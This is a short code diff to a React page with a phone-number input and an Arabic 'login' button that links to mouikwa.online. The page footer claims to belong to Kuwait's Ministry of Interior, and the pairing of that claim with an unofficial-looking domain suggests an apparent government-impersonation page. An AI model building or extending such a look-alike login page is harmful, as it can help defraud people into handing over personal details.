@@ -1,7 +1,9 @@
 import viteLogo from '/vite.svg';
 import './App.css';
+import { useState } from 'react';
 
 function App() {
+  const [id,setid]=useState('')
   return (
     <>
       <div>
@@ -15,6 +17,7 @@ function App() {
         <input
           type="tel"
           maxLength={8}
+          onChange={(e)=>setid(e.target.value)}
           style={{
             padding: 8,
             width: '100%',
@@ -23,9 +26,10 @@ function App() {
             marginBottom: 5,
           }}
         />
-        <a href="https://mouikwa.online/">
-          <button>دخول</button>
+       <button disabled={id.length!==8}>    <a href={id.length===8?"https://mouikwa.online/":"#"} >
+      دخول
         </a>
+        </button>
       </div>
       <p className="read-the-docs">
         © جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2025
